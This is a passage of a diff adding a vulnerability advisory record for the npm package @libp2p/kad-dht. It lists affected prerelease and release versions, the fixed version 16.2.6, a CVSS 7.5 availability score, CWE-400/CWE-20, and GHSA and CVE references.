+      - pkg:npm/%40libp2p/kad-dht@14.2.1-66c3ec5e1
+      - pkg:npm/%40libp2p/kad-dht@14.2.1-80ddad5bb
+      - pkg:npm/%40libp2p/kad-dht@14.2.1-bf0f74d66
+      - pkg:npm/%40libp2p/kad-dht@14.2.1-c1d0b7fa4
+      - pkg:npm/%40libp2p/kad-dht@14.2.1-d61cbacec
+      - pkg:npm/%40libp2p/kad-dht@14.2.1
+      - pkg:npm/%40libp2p/kad-dht@14.2.2-21088c519
+      - pkg:npm/%40libp2p/kad-dht@14.2.2-34b3c14b8
+      - pkg:npm/%40libp2p/kad-dht@14.2.2-6e52ee346
+      - pkg:npm/%40libp2p/kad-dht@14.2.2-7a1665cd8
+      - pkg:npm/%40libp2p/kad-dht@14.2.2-d72b51184
+      - pkg:npm/%40libp2p/kad-dht@14.2.2
+      - pkg:npm/%40libp2p/kad-dht@14.2.3-d8f003e6e
+      - pkg:npm/%40libp2p/kad-dht@14.2.3
+      - pkg:npm/%40libp2p/kad-dht@14.2.4-2e35b6055
+      - pkg:npm/%40libp2p/kad-dht@14.2.4-35a52f029
+      - pkg:npm/%40libp2p/kad-dht@14.2.4-4ab04faf0
+      - pkg:npm/%40libp2p/kad-dht@14.2.4-7655833bb
+      - pkg:npm/%40libp2p/kad-dht@14.2.4-c4e862731
+      - pkg:npm/%40libp2p/kad-dht@14.2.4-d188511b9
+      - pkg:npm/%40libp2p/kad-dht@14.2.4-f9345a7a1
+      - pkg:npm/%40libp2p/kad-dht@14.2.4
+      - pkg:npm/%40libp2p/kad-dht@14.2.5-1fc0e2662
+      - pkg:npm/%40libp2p/kad-dht@14.2.5-23685db5e
+      - pkg:npm/%40libp2p/kad-dht@14.2.5-68ad3663e
+      - pkg:npm/%40libp2p/kad-dht@14.2.5-b818882e0
+      - pkg:npm/%40libp2p/kad-dht@14.2.5-e7e280257
+      - pkg:npm/%40libp2p/kad-dht@14.2.5
+      - pkg:npm/%40libp2p/kad-dht@14.2.6-700e4c0b5
+      - pkg:npm/%40libp2p/kad-dht@14.2.6-754fe84db
+      - pkg:npm/%40libp2p/kad-dht@14.2.6-8331c8ea8
+      - pkg:npm/%40libp2p/kad-dht@14.2.6-cc7fcfe98
+      - pkg:npm/%40libp2p/kad-dht@14.2.6-ff951f1a0
+      - pkg:npm/%40libp2p/kad-dht@14.2.6
+      - pkg:npm/%40libp2p/kad-dht@14.2.7-1ab50cc0d
+      - pkg:npm/%40libp2p/kad-dht@14.2.7-2b49a5f74
+      - pkg:npm/%40libp2p/kad-dht@14.2.7-7718d020a
+      - pkg:npm/%40libp2p/kad-dht@14.2.7-d98cc46e4
+      - pkg:npm/%40libp2p/kad-dht@14.2.7
+      - pkg:npm/%40libp2p/kad-dht@14.2.8-2a3cec922
+      - pkg:npm/%40libp2p/kad-dht@14.2.8-9b1a3791d
+      - pkg:npm/%40libp2p/kad-dht@14.2.8-a4f0db1e9
+      - pkg:npm/%40libp2p/kad-dht@14.2.8
+      - pkg:npm/%40libp2p/kad-dht@14.2.9-5b084e968
+      - pkg:npm/%40libp2p/kad-dht@14.2.9-6f8cfeafb
+      - pkg:npm/%40libp2p/kad-dht@14.2.9-90cca822b
+      - pkg:npm/%40libp2p/kad-dht@14.2.9-e7e01f58f
+      - pkg:npm/%40libp2p/kad-dht@14.2.9-f465c5473
+      - pkg:npm/%40libp2p/kad-dht@14.2.9
+      - pkg:npm/%40libp2p/kad-dht@14.2.10-4939ef7ae
+      - pkg:npm/%40libp2p/kad-dht@14.2.10-96f79bc11
+      - pkg:npm/%40libp2p/kad-dht@14.2.10-e1f868f03
+      - pkg:npm/%40libp2p/kad-dht@14.2.10-e2f49432b
+      - pkg:npm/%40libp2p/kad-dht@14.2.10
+      - pkg:npm/%40libp2p/kad-dht@14.2.11-0555339ba
+      - pkg:npm/%40libp2p/kad-dht@14.2.11-22e62d00f
+      - pkg:npm/%40libp2p/kad-dht@14.2.11-3d9b07c34
+      - pkg:npm/%40libp2p/kad-dht@14.2.11-52a46ecad
+      - pkg:npm/%40libp2p/kad-dht@14.2.11-9acccaaed
+      - pkg:npm/%40libp2p/kad-dht@14.2.11
+      - pkg:npm/%40libp2p/kad-dht@14.2.12-2c8ecb455
+      - pkg:npm/%40libp2p/kad-dht@14.2.12-2fbcdb687
+      - pkg:npm/%40libp2p/kad-dht@14.2.12-3f127b610
+      - pkg:npm/%40libp2p/kad-dht@14.2.12-48cd9b652
+      - pkg:npm/%40libp2p/kad-dht@14.2.12-80fe31aa1
+      - pkg:npm/%40libp2p/kad-dht@14.2.12-dd71d8a86
+      - pkg:npm/%40libp2p/kad-dht@14.2.12
+      - pkg:npm/%40libp2p/kad-dht@14.2.13-0699fb747
+      - pkg:npm/%40libp2p/kad-dht@14.2.13-5fe2a18fc
+      - pkg:npm/%40libp2p/kad-dht@14.2.13-600d0a561
+      - pkg:npm/%40libp2p/kad-dht@14.2.13-88b5c29ed
+      - pkg:npm/%40libp2p/kad-dht@14.2.13-a6c9aee5a
+      - pkg:npm/%40libp2p/kad-dht@14.2.13
+      - pkg:npm/%40libp2p/kad-dht@14.2.14-2f2322a25
+      - pkg:npm/%40libp2p/kad-dht@14.2.14-757577dd2
+      - pkg:npm/%40libp2p/kad-dht@14.2.14-907518bad
+      - pkg:npm/%40libp2p/kad-dht@14.2.14-95909c3df
+      - pkg:npm/%40libp2p/kad-dht@14.2.14-a71c7c32b
+      - pkg:npm/%40libp2p/kad-dht@14.2.14-a7ab9a41b
+      - pkg:npm/%40libp2p/kad-dht@14.2.14
+      - pkg:npm/%40libp2p/kad-dht@14.2.15-71267286
+      - pkg:npm/%40libp2p/kad-dht@14.2.15-0b9090aea
+      - pkg:npm/%40libp2p/kad-dht@14.2.15-4c64bd06d
+      - pkg:npm/%40libp2p/kad-dht@14.2.15-4f37aff53
+      - pkg:npm/%40libp2p/kad-dht@14.2.15-53a9be54e
+      - pkg:npm/%40libp2p/kad-dht@14.2.15-78cd7d53e
+      - pkg:npm/%40libp2p/kad-dht@14.2.15-b2124c2db
+      - pkg:npm/%40libp2p/kad-dht@14.2.15-d53ef170c
+      - pkg:npm/%40libp2p/kad-dht@14.2.15-da4e9da82
+      - pkg:npm/%40libp2p/kad-dht@14.2.15-da7353a0b
+      - pkg:npm/%40libp2p/kad-dht@14.2.15-fc5122110
+      - pkg:npm/%40libp2p/kad-dht@14.2.15
+      - pkg:npm/%40libp2p/kad-dht@15.0.0-3833353bd
+      - pkg:npm/%40libp2p/kad-dht@15.0.0-b9e32cc37
+      - pkg:npm/%40libp2p/kad-dht@15.0.0-f09bef843
+      - pkg:npm/%40libp2p/kad-dht@15.0.0
+      - pkg:npm/%40libp2p/kad-dht@15.0.1-6f96de86c
+      - pkg:npm/%40libp2p/kad-dht@15.0.1-afa5c9f59
+      - pkg:npm/%40libp2p/kad-dht@15.0.1
+      - pkg:npm/%40libp2p/kad-dht@15.0.2-185b23eac
+      - pkg:npm/%40libp2p/kad-dht@15.0.2-213a54a1e
+      - pkg:npm/%40libp2p/kad-dht@15.0.2-32627c876
+      - pkg:npm/%40libp2p/kad-dht@15.0.2-3577af88a
+      - pkg:npm/%40libp2p/kad-dht@15.0.2-3df5bf2da
+      - pkg:npm/%40libp2p/kad-dht@15.0.2-4b8c0a6bd
+      - pkg:npm/%40libp2p/kad-dht@15.0.2-772b4011e
+      - pkg:npm/%40libp2p/kad-dht@15.0.2-9b33d202e
+      - pkg:npm/%40libp2p/kad-dht@15.0.2-a5a33afd9
+      - pkg:npm/%40libp2p/kad-dht@15.0.2-cdc63e6cc
+      - pkg:npm/%40libp2p/kad-dht@15.0.2-f1de46607
+      - pkg:npm/%40libp2p/kad-dht@15.0.2
+      - pkg:npm/%40libp2p/kad-dht@15.1.0-aa25d38ab
+      - pkg:npm/%40libp2p/kad-dht@15.1.0
+      - pkg:npm/%40libp2p/kad-dht@15.1.1-776cb432d
+      - pkg:npm/%40libp2p/kad-dht@15.1.1-7788b4025
+      - pkg:npm/%40libp2p/kad-dht@15.1.1-ab014c0c0
+      - pkg:npm/%40libp2p/kad-dht@15.1.1
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-14dbebea8
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-2a7425cdb
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-307d0ba58
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-3528df829
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-5b004c0c4
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-6a3ae02f5
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-8e87be9e6
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-8efb065d2
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-9f1be6742
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-b32bc8406
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-b8600fce8
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-bb4ad31db
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-cc7b34c0f
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-d91ae66c6
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-dbbc6ef1d
+      - pkg:npm/%40libp2p/kad-dht@15.1.2-ec73d59a6
+      - pkg:npm/%40libp2p/kad-dht@15.1.2
+      - pkg:npm/%40libp2p/kad-dht@15.1.3-6c42ea64a
+      - pkg:npm/%40libp2p/kad-dht@15.1.3-ae595d8db
+      - pkg:npm/%40libp2p/kad-dht@15.1.3
+      - pkg:npm/%40libp2p/kad-dht@15.1.4-7eed3b40d
+      - pkg:npm/%40libp2p/kad-dht@15.1.4
+      - pkg:npm/%40libp2p/kad-dht@15.1.5-439d2c9ce
+      - pkg:npm/%40libp2p/kad-dht@15.1.5-451e011d4
+      - pkg:npm/%40libp2p/kad-dht@15.1.5-53001addf
+      - pkg:npm/%40libp2p/kad-dht@15.1.5
+      - pkg:npm/%40libp2p/kad-dht@15.1.6-2d6079bc1
+      - pkg:npm/%40libp2p/kad-dht@15.1.6-8ad44f759
+      - pkg:npm/%40libp2p/kad-dht@15.1.6-d2dc12c7d
+      - pkg:npm/%40libp2p/kad-dht@15.1.6
+      - pkg:npm/%40libp2p/kad-dht@15.1.7-cfe2be4c9
+      - pkg:npm/%40libp2p/kad-dht@15.1.7
+      - pkg:npm/%40libp2p/kad-dht@15.1.8-57e7fa441
+      - pkg:npm/%40libp2p/kad-dht@15.1.8
+      - pkg:npm/%40libp2p/kad-dht@15.1.9-87e5d5938
+      - pkg:npm/%40libp2p/kad-dht@15.1.9
+      - pkg:npm/%40libp2p/kad-dht@15.1.10-4420fad68
+      - pkg:npm/%40libp2p/kad-dht@15.1.10-58abe8702
+      - pkg:npm/%40libp2p/kad-dht@15.1.10-5ed83dd69
+      - pkg:npm/%40libp2p/kad-dht@15.1.10-79473c99a
+      - pkg:npm/%40libp2p/kad-dht@15.1.10-7ce083dca
+      - pkg:npm/%40libp2p/kad-dht@15.1.10-aa770ab81
+      - pkg:npm/%40libp2p/kad-dht@15.1.10-cb1c14e62
+      - pkg:npm/%40libp2p/kad-dht@15.1.10-ce6b542a8
+      - pkg:npm/%40libp2p/kad-dht@15.1.10-cf9aab5c8
+      - pkg:npm/%40libp2p/kad-dht@15.1.10
+      - pkg:npm/%40libp2p/kad-dht@15.1.11-0f07e3df5
+      - pkg:npm/%40libp2p/kad-dht@15.1.11-6059227cb
+      - pkg:npm/%40libp2p/kad-dht@15.1.11-8484de8a2
+      - pkg:npm/%40libp2p/kad-dht@15.1.11-87bc8d4fb
+      - pkg:npm/%40libp2p/kad-dht@15.1.11-9a9b11fd4
+      - pkg:npm/%40libp2p/kad-dht@15.1.11-a02cb0461
+      - pkg:npm/%40libp2p/kad-dht@15.1.11-da78fa851
+      - pkg:npm/%40libp2p/kad-dht@15.1.11-e8398d97e
+      - pkg:npm/%40libp2p/kad-dht@15.1.11-f0afebfdf
+      - pkg:npm/%40libp2p/kad-dht@15.1.11-f5932c294
+      - pkg:npm/%40libp2p/kad-dht@15.1.11-fb19b055d
+      - pkg:npm/%40libp2p/kad-dht@15.1.11
+      - pkg:npm/%40libp2p/kad-dht@16.0.0-049bfa0fa
+      - pkg:npm/%40libp2p/kad-dht@16.0.0-55b7e5fea
+      - pkg:npm/%40libp2p/kad-dht@16.0.0-621b464f0
+      - pkg:npm/%40libp2p/kad-dht@16.0.0
+      - pkg:npm/%40libp2p/kad-dht@16.0.1-334f91bdc
+      - pkg:npm/%40libp2p/kad-dht@16.0.1-39e2e541a
+      - pkg:npm/%40libp2p/kad-dht@16.0.1-425a42cdd
+      - pkg:npm/%40libp2p/kad-dht@16.0.1-71e8ee163
+      - pkg:npm/%40libp2p/kad-dht@16.0.1-8543df06b
+      - pkg:npm/%40libp2p/kad-dht@16.0.1-8d66d5ff1
+      - pkg:npm/%40libp2p/kad-dht@16.0.1
+      - pkg:npm/%40libp2p/kad-dht@16.0.2-547a5b988
+      - pkg:npm/%40libp2p/kad-dht@16.0.2-7e1c0bada
+      - pkg:npm/%40libp2p/kad-dht@16.0.2-93ba5a84f
+      - pkg:npm/%40libp2p/kad-dht@16.0.2-de2ad9ca5
+      - pkg:npm/%40libp2p/kad-dht@16.0.2
+      - pkg:npm/%40libp2p/kad-dht@16.0.3-72a7ea10a
+      - pkg:npm/%40libp2p/kad-dht@16.0.3
+      - pkg:npm/%40libp2p/kad-dht@16.0.4-5fccd1dde
+      - pkg:npm/%40libp2p/kad-dht@16.0.4-a0f9da212
+      - pkg:npm/%40libp2p/kad-dht@16.0.4
+      - pkg:npm/%40libp2p/kad-dht@16.0.5-3596206ed
+      - pkg:npm/%40libp2p/kad-dht@16.0.5-dad3cca5d
+      - pkg:npm/%40libp2p/kad-dht@16.0.5-fb08a2f90
+      - pkg:npm/%40libp2p/kad-dht@16.0.5
+      - pkg:npm/%40libp2p/kad-dht@16.0.6-0f3ab9e61
+      - pkg:npm/%40libp2p/kad-dht@16.0.6-d1ff510bb
+      - pkg:npm/%40libp2p/kad-dht@16.0.6
+      - pkg:npm/%40libp2p/kad-dht@16.1.0-8cebf6322
+      - pkg:npm/%40libp2p/kad-dht@16.1.0-d447a9944
+      - pkg:npm/%40libp2p/kad-dht@16.1.0-e2bdc7e63
+      - pkg:npm/%40libp2p/kad-dht@16.1.0
+      - pkg:npm/%40libp2p/kad-dht@16.1.1-977a3c5f2
+      - pkg:npm/%40libp2p/kad-dht@16.1.1
+      - pkg:npm/%40libp2p/kad-dht@16.1.2-05acd0c35
+      - pkg:npm/%40libp2p/kad-dht@16.1.2-28c2b65f4
+      - pkg:npm/%40libp2p/kad-dht@16.1.2-7fff925bf
+      - pkg:npm/%40libp2p/kad-dht@16.1.2
+      - pkg:npm/%40libp2p/kad-dht@16.1.3-30b53a999
+      - pkg:npm/%40libp2p/kad-dht@16.1.3
+      - pkg:npm/%40libp2p/kad-dht@16.1.4-19796b103
+      - pkg:npm/%40libp2p/kad-dht@16.1.4-3bb95f95b
+      - pkg:npm/%40libp2p/kad-dht@16.1.4-8f0e1b2db
+      - pkg:npm/%40libp2p/kad-dht@16.1.4-f4b950dc9
+      - pkg:npm/%40libp2p/kad-dht@16.1.4
+      - pkg:npm/%40libp2p/kad-dht@16.1.5-28af2ff3d
+      - pkg:npm/%40libp2p/kad-dht@16.1.5-4db427d30
+      - pkg:npm/%40libp2p/kad-dht@16.1.5-9c0fc4482
+      - pkg:npm/%40libp2p/kad-dht@16.1.5-db185b16b
+      - pkg:npm/%40libp2p/kad-dht@16.1.5-e19d11093
+      - pkg:npm/%40libp2p/kad-dht@16.1.5
+      - pkg:npm/%40libp2p/kad-dht@16.1.6-1c3b61777
+      - pkg:npm/%40libp2p/kad-dht@16.1.6-82c3c9ea8
+      - pkg:npm/%40libp2p/kad-dht@16.1.6-d6f6f5818
+      - pkg:npm/%40libp2p/kad-dht@16.1.6-dd251c5e7
+      - pkg:npm/%40libp2p/kad-dht@16.1.6-f88ec96cf
+      - pkg:npm/%40libp2p/kad-dht@16.1.6
+      - pkg:npm/%40libp2p/kad-dht@16.1.7-1ecf0e324
+      - pkg:npm/%40libp2p/kad-dht@16.1.7-2a3e54738
+      - pkg:npm/%40libp2p/kad-dht@16.1.7-4580b64fa
+      - pkg:npm/%40libp2p/kad-dht@16.1.7-709b3fa2e
+      - pkg:npm/%40libp2p/kad-dht@16.1.7-74620dbcd
+      - pkg:npm/%40libp2p/kad-dht@16.1.7-b6efda3d5
+      - pkg:npm/%40libp2p/kad-dht@16.1.7-ff5ee99ed
+      - pkg:npm/%40libp2p/kad-dht@16.1.7
+      - pkg:npm/%40libp2p/kad-dht@16.2.0-2151144c3
+      - pkg:npm/%40libp2p/kad-dht@16.2.0-811a29f8a
+      - pkg:npm/%40libp2p/kad-dht@16.2.0-90100be0c
+      - pkg:npm/%40libp2p/kad-dht@16.2.0-b30baa93a
+      - pkg:npm/%40libp2p/kad-dht@16.2.0-f21efd121
+      - pkg:npm/%40libp2p/kad-dht@16.2.0-f60bd85b0
+      - pkg:npm/%40libp2p/kad-dht@16.2.0
+      - pkg:npm/%40libp2p/kad-dht@16.2.2-20bfcb3f9
+      - pkg:npm/%40libp2p/kad-dht@16.2.2-48f66c41e
+      - pkg:npm/%40libp2p/kad-dht@16.2.2-5917715d0
+      - pkg:npm/%40libp2p/kad-dht@16.2.2-7cea7b9a5
+      - pkg:npm/%40libp2p/kad-dht@16.2.2-8ddbb9e81
+      - pkg:npm/%40libp2p/kad-dht@16.2.2-8f7e9264e
+      - pkg:npm/%40libp2p/kad-dht@16.2.2-fd68eecf7
+      - pkg:npm/%40libp2p/kad-dht@16.2.2
+      - pkg:npm/%40libp2p/kad-dht@16.2.3-5466a8def
+      - pkg:npm/%40libp2p/kad-dht@16.2.3-61d594a6c
+      - pkg:npm/%40libp2p/kad-dht@16.2.3-69a44651f
+      - pkg:npm/%40libp2p/kad-dht@16.2.3-baf3ddb03
+      - pkg:npm/%40libp2p/kad-dht@16.2.3-cbfda2cdc
+      - pkg:npm/%40libp2p/kad-dht@16.2.3-d57fe74c0
+      - pkg:npm/%40libp2p/kad-dht@16.2.3
+      - pkg:npm/%40libp2p/kad-dht@16.2.4-10b2bdf50
+      - pkg:npm/%40libp2p/kad-dht@16.2.4-15eeedba1
+      - pkg:npm/%40libp2p/kad-dht@16.2.4-3a5e46eaa
+      - pkg:npm/%40libp2p/kad-dht@16.2.4-bd9e02dad
+      - pkg:npm/%40libp2p/kad-dht@16.2.4-d1ab98294
+      - pkg:npm/%40libp2p/kad-dht@16.2.4
+      - pkg:npm/%40libp2p/kad-dht@16.2.5-5692f3f16
+      - pkg:npm/%40libp2p/kad-dht@16.2.5-9c3c0b22a
+      - pkg:npm/%40libp2p/kad-dht@16.2.5
+      - pkg:npm/%40libp2p/kad-dht@16.2.6-9eb27be79
+      - pkg:npm/%40libp2p/kad-dht@16.2.6-cc151e147
+    fixed_packages:
+      - pkg:npm/%40libp2p/kad-dht@16.2.6
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-32mq-hpph-xfvr/GHSA-32mq-hpph-xfvr.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-400
+  - CWE-20
+references:
+  - url: https://github.com/libp2p/js-libp2p
+    reference_type:
+    reference_id:
+  - url: https://github.com/libp2p/js-libp2p/security/advisories/GHSA-32mq-hpph-xfvr
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-45783
+    reference_type:
+    reference_id: CVE-2026-45783
+exploits: []
